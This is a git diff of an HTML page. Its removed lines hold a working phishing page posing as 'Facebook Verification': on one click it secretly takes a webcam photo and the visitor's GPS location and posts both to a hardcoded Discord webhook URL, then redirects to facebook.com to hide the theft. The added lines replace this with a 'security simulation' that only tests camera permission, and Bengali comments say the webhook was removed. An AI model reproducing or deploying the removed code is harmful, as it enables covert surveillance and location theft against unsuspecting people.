@@ -1,37 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Facebook Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Awareness Test</title>
     <style>
-        body { background: #f0f2f5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; }
-        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding: 50px; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        h2 { color: #1c1e21; }
+        p { color: #606770; font-size: 14px; }
+        .btn { background-color: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; width: 100%; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="color: #1877f2;">facebook</h2>
-        <p>Verify your identity to secure your account.</p>
-        <button onclick="start()">Confirm Identity</button>
+    <div class="container">
+        <h2>Identity Verification</h2>
+        <p>This is a security simulation. Please click continue to test device permission handling.</p>
+        <button class="btn" onclick="startTest()">Continue</button>
+        <p id="status" style="margin-top:15px; font-weight:bold;"></p>
     </div>
-    <video id="v" style="display:none" autoplay></video>
-    <canvas id="c" style="display:none"></canvas>
+
     <script>
-        async function start() {
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            document.getElementById('v').srcObject = stream;
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                const canvas = document.getElementById('c');
-                const video = document.getElementById('v');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(async (b) => {
-                    const fd = new FormData();
-                    fd.append('file', b, 'img.jpg');
-                    fd.append('payload_json', JSON.stringify({content: `📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`}));
-                    await fetch("https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0", {method:'POST', body:fd});
-                    window.location.href = "https://facebook.com";
-                }, 'image/jpeg');
+        function startTest() {
+            document.getElementById('status').innerText = "Testing camera access...";
+            
+            // ক্যামেরা এক্সেস টেস্ট (শুধুমাত্র শেখার জন্য)
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById('status').style.color = "green";
+                document.getElementById('status').innerText = "Access Granted! (Simulation)";
+                // এখানে আগে ডিসকর্ড ওয়েবহুক ছিল, যা এখন রিমুভ করা হয়েছে।
+                stream.getTracks().forEach(track => track.stop());
+            })
+            .catch(err => {
+                document.getElementById('status').style.color = "red";
+                document.getElementById('status').innerText = "Access Denied!";
             });
         }
     </script>
